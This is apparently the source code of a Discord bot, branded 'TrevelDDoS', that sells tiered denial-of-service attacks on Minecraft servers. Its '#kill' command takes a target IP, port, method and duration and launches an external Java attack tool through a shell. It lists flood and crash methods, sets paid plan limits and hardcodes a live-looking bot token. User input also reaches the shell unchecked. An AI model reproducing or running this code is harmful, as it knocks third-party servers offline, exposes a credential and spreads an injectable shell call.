import discord
import re
from discord.ext import commands
import subprocess
import urllib
import json
####################    Кто Сольет Тот Гей, Я За Всем Слежу By gregorgame1409 ####################
jar = "xxx.jar"
zombie=False
bot_token = "OTc3OTA5ODgyNTM3Nzc1MTE0.GGJlGi.SYhtpRrm83C6-MgiwfVgKEgqp9HzXLwXFaEGhA"
methods_all = ['legitjoin',
'localhost',
'invalidnames',
'longnames',
'botjoiner',
'spoof',
'ping',
'nullping',
'multikiller',
'handshake',
'bighandshake',
'query',
'bigpacket',
'network',
'randombytes',
'extremejoin',
'spamjoin',
'nettydowner',
'ram',
'yoonikscry',
'colorcrasher',
'tcphit',
'queue',
'botnet',
'tcpbypass',
'ultimatesmasher',
'sf',
'nabcry']
methods_secret = []
channels = [974577371908816996,952134816285986857,952134888209924146]
########################################

############## Настройки планов ##############

free = [20000, 25]
free_role = 974663378716995585
basic = [45000, 45]
basic_role = 974578352579047455
advanced = [60000, 60]
advanced_role = 974578433625563206
premium = [85000, 100]
premium_role = 974662014569951302
legendary = [100000, 130]
legendary_role = 974662591307722762
fullplan = [160000, 120]
fullplan_role = 974578640048230460
infinity = [999999999, 900]
infinity_role = 974578539514986496
admin = [999999999, 999999999]
admin_role = 974578187084386314
##############################################

############### BlackList ####################
blacklist_ip = ['127.0.0.1', 'localhost', '0.0.0.0']
##############################################

############## Сокращения ##############
bot = commands.Bot(command_prefix='#')
client = discord.Client()
########################################

############################ Команды при запуске бота ################################
@bot.event
async def on_ready():
	print('Админ gregorgame1409 Бот Включен!')
######################################################################################

################################ Команды при присоединении бота ########################################################
async def on_guild_join(guild):
	print(f"Братан, меня пригласили на сервер '{guild.name}'")
########################################################################################################################

#################### def #####################
async def blist(ip):
	for i in blacklist_ip:
		if i == ip:
			return True
		else:
			return False
async def isInt(s):
	try:
		float(s)
		return True
	except ValueError:
		return False
async def whois(self):
	prime = 0
	for role in self.author.roles:
		if role.id == free_role:
			if prime <= 1:
				prime = 1
		elif role.id == basic_role:
			if prime <= 2:
				prime = 2
		elif role.id == advanced_role:
			if prime <= 3:
				prime = 3
		elif role.id == premium_role:
			if prime <= 4:
				prime = 4
		elif role.id == legendary_role:
			if prime <= 5:
				prime = 5
		elif role.id == fullplan_role:
			if prime <= 6:
				prime = 6
		elif role.id == infinity_role:
			if prime <= 7:
				prime = 7
		elif role.id == admin_role:
			if prime <= 8:
				prime = 8
			break
	return prime
##############################################

############################################ Команды бота ##############################################################
@bot.command()
@commands.cooldown(1, 1, commands.BucketType.user)
async def resolve(ctx, arg1):
    url = "http://api.mcsrvstat.us/2/" + arg1
    file = urllib.request.urlopen(url)

    for line in file:
        decoded_line = line.decode("utf-8")

    json_object = json.loads(decoded_line)

    embed = discord.Embed(
        title="Resolved!",
        color=discord.Colour.red()
    )

    embed.add_field(name='IP:', value=json_object["ip"], inline=False)
    embed.add_field(name='Port:', value=json_object["port"], inline=False)
    embed.add_field(name="Hostname:", value=json_object["hostname"], inline=False)
    embed.add_field(name="Server Online:", value=json_object["online"], inline=False)

    g = json_object["ip"]
    gb = json_object["port"]

    embed.set_image(url=f'http://status.mclive.eu/storm/{g}/{gb}/banner.png')
    embed.set_footer(text="TrevelDDos ")
    await ctx.send(embed=embed)
@bot.command(name="protocols")
async def protocols_(self):
	embed = discord.Embed(
		title='',
		description=f"""Протоколы:
(Версии для произведения атаки на сервер)
`1.18.1 - 757
1.17.1 - 756
1.17 - 755
1.16.5 - 754
1.16.4 - 754
1.16.3 - 753
1.16.2 - 751
1.16.1 - 736
1.16 - 735
1.15.2 - 578
1.15.1 - 575
1.15 - 573
1.14.4 - 498
1.14.3 - 490
1.14.2 - 485
1.14.1 - 480
1.14 - 477
1.13.2 - 404
1.13.1 - 401
1.13 - 393
1.12.2 - 340
1.12.1 - 338
1.12 - 335
1.11.2 - 316
1.11.1 - 316
1.11 - 315
1.10.2 - 210
1.10.1 - 210
1.10 - 210
1.9.4 - 110
1.9.3 - 110
1.9.2 - 109
1.9.1 - 109
1.9 - 107
1.8.9 - 47
1.8.8 - 47
1.8.7 - 47
1.8.6 - 47
1.8.5 - 47
1.8.4 - 47
1.8.3 - 47
1.8.2 - 47
1.8.1 - 47
1.7.10 - 5
1.7.9 - 5
1.7.8 - 5
1.7.7 - 5
1.7.6 - 5
1.7.5 - 4
1.7.4 - 4
1.7.2 - 4`""",
		color=discord.Color(0x2F3136)
	   )
	embed.set_author(
	   name="Протоколы", icon_url=self.bot.user.avatar_url
	   )
	await self.send(embed=embed)
@bot.command(name="stop")
@commands.has_permissions(administrator=True)
async def stop_(self):
	subprocess.Popen("pkill 'java'", shell=True)
	embed = discord.Embed(title='', description=f'Все атаки остановлены!', color=discord.Color(0x2F3136))
	embed.set_author(name="Остановлено", icon_url=self.bot.user.avatar_url)
	await self.send(embed=embed)
@bot.remove_command(name="help")
@bot.command(name="help")
async def help_(self):
	if not zombie:
		msg_embed = discord.Embed(title="",
								  description=f"""#kill <айпи> <порт> <протокол> <метод> <время> <скорость> - Запустить атаку
									   #help - Меню помощи.
									   #methods - Список методов.
									   #stop - Остановить все атаки. (Admin only)
					   				   #protocols - Список протоколов
					   				   #resolve <айпи> - Статус сервера
									   """,

								  color=discord.Color(0x2F3136))
		msg_embed.set_author(
			name="Помощь", icon_url=self.bot.user.avatar_url
		)
		await self.send(embed=msg_embed)
@bot.command(name="plans")
async def plans_(self):
	if not zombie:
		msg_embed = discord.Embed(title="",
								  description=f"""Посмотрите в канал <#974577541425795102> или попросите Free у администрации.""",

								  color=discord.Color(0x2F3136))
		msg_embed.set_author(
			name="Планы", icon_url=self.bot.user.avatar_url
		)
		await self.send(embed=msg_embed)

@bot.command(name="methods")
async def methods_(self):
	if not zombie:
		msg_embed = discord.Embed(title="",
								  description=f"""join
legitjoin
localhost
invalidnames
longnames
botjoiner
spoof
ping
nullping
multikiller
handshake
bighandshake
query
bigpacket
network
randombytes
extremejoin
spamjoin
nettydowner
ram
yoonikscry
colorcrasher
tcphit
queue
botnet
tcpbypass
ultimatesmasher
sf
nabcry""",
								  color=discord.Color(0x2F3136))
		msg_embed.set_author(
			name="Методы", icon_url=self.bot.user.avatar_url
		)
		await self.send(embed=msg_embed)
@bot.command(name="kill")
async def attack_(self, ctx, *, arg):
	if self.channel.id in channels:
		pattern = re.compile(r'\w+')
		args = pattern.findall(arg)
		lena = len(args) + 1
		lenin = [4,5,6]
		if not lena in lenin:
			await help_(self)
		else:
			if await blist(ctx):
				if not zombie:
					msg_embed = discord.Embed(title="",
											  description=f"{ctx} Этот сервер нельзя ддосить.",
											  color=discord.Color(0x2F3136))
					msg_embed.set_author(
					   name="Error", icon_url=self.bot.user.avatar_url
					)
					await self.send(embed=msg_embed)
			else:
				prime = await whois(self)
				if self.author.id == 924619107733757992:
					prime = 6
				start_info = []
				attack = True
				if prime == 0:
					await plans_(self)
					attack = False
				elif prime == 1:
					start_info = [ctx, args[0], args[1], 'free', args[2], free[1], free[0]]
				elif prime == 2:
					start_info = [ctx, args[0], args[1], 'basic', args[2], basic[1], basic[0]]
				elif prime == 3:
					start_info = [ctx, args[0], args[1], 'advanced', args[2], advanced[1], advanced[0]]
				elif prime == 4:
					start_info = [ctx, args[0], args[1], 'premium', args[2], premium[1], premium[0]]
				elif prime == 5:
					start_info = [ctx, args[0], args[1], 'legendary', args[2], legendary[1], legendary[0]]
					if isInt(start_info[5]) and attack:
						time = float(start_info[5])
						if attack and 0 < time <= float(legendary[0]):
							pass
						else:
							attack = False
					else:
						attack = False
				elif prime == 6:
					start_info = [ctx, args[0], args[1], 'full plan', args[2], args[3], args[4]]
					if await isInt(start_info[5]) and attack:
						time = float(start_info[5])
						if await isInt(start_info[6]):
							сps = float(start_info[6])
							if attack and 0 < time <= float(fullplan[1]):
								pass
							else:
								attack = False
							if attack and 0 < сps <= float(fullplan[0]):
								pass
							else:
								attack = False
					else:
						attack = False
				elif prime == 7:
					start_info = [ctx, args[0], args[1], 'infinity', args[2], args[3], args[4]]
					if await isInt(start_info[5]) and attack:
						time = float(start_info[5])
						сps = start_info[6]
						if time > 901:
							attack = False
						else:
							attack = True
				elif prime == 8:
					start_info = [ctx, args[0], args[1], 'admin', args[2], args[3], args[4]]
					if await isInt(start_info[5]) and attack:
						time = float(start_info[5])
						сps = start_info[6]
						if time > 999999999:
							attack = False
						else:
							attack = True
				if attack:
					if not await blist(start_info[0]):
						if start_info[4] in methods_all:
							if prime == 1:
								pass
							else:
								if await isInt(start_info[1]) == True == await isInt(start_info[2]) and await isInt(start_info[5]) == True == await isInt(start_info[6]):
									msg_embed=discord.Embed(
										title='TrevelDDoS',
										description='',
										color=discord.Color(0x2F3136)
									)
									msg_embed.set_author(name="TrevelDDoS", icon_url=self.bot.user.avatar_url)
									msg_embed.add_field(name='Айпи:', value=f'{start_info[0]}', inline=False)
									msg_embed.add_field(name='Порт:', value=f'{start_info[1]}', inline=False)
									msg_embed.add_field(name='Протокол:', value=f'{start_info[2]}', inline=False)
									msg_embed.add_field(name='Метод:', value=f'{start_info[4]}', inline=False)
									msg_embed.add_field(name='Время:', value=f'{start_info[5]}', inline=False)
									msg_embed.add_field(name='Скорость:', value=f'{start_info[6]}', inline=False)
									msg_embed.set_image(url=f'https://media.discordapp.net/attachments/978237381549375498/978237472255385610/sandyxlezbikul.gif')
									msg_embed.set_footer(text="TrevelDDoS")
									await self.send(embed=msg_embed)
									subprocess.Popen(f"java -jar {jar} {start_info[0]}:{start_info[1]} {start_info[2]} {start_info[4]} {start_info[5]} {start_info[6]}",shell=True)
								else:
									await help_(self)
						elif start_info[4] in methods_secret:
							pass
						else:
							await methods_(self)
					else:
						if not zombie:
							msg_embed = discord.Embed(title="",
													  description=f"The IP '{start_info[0]}' is forbidden to attack.",
													  color=discord.Color(0x2F3136))
							msg_embed.set_author(
								name="Error", icon_url=self.bot.user.avatar_url
							)
							await self.send(embed=msg_embed)
				else:
					msg_embed = discord.Embed(title="ERROR",
												description=f"",
												color=discord.Color(0x2F3133))
					msg_embed.add_field(name='ОШИБКА', value=f'Неизвестная ошибка!', inline=False)
	else:
		pass
@bot.event 
async def on_command_error(ctx, error): 
    if isinstance(error, commands.CommandNotFound): 
        em = discord.Embed(title=f"Ошибка.", description=f"Команда не найдена.", color=discord.Color(0x2F3133)) 
        await ctx.send(embed=em) 
    if isinstance(error, commands.MissingRequiredArgument):
        em = discord.Embed(title=f"Ошибка.", description=f"Укажи аргументы правильно.", color=discord.Color(0x2F3133))
        em.add_field(name="Помощь:", value="#help", inline=True)
        await ctx.send(embed=em) 
    if isinstance(error, commands.MissingRole):
        em = discord.Embed(title=f"Ошибка.", description=f"У тебя нету прав.", color=discord.Color(0x2F3133))
        await ctx.send(embed=em)
########################################################################################################################

######## Запуск бота ########
bot.run(bot_token)
#############################
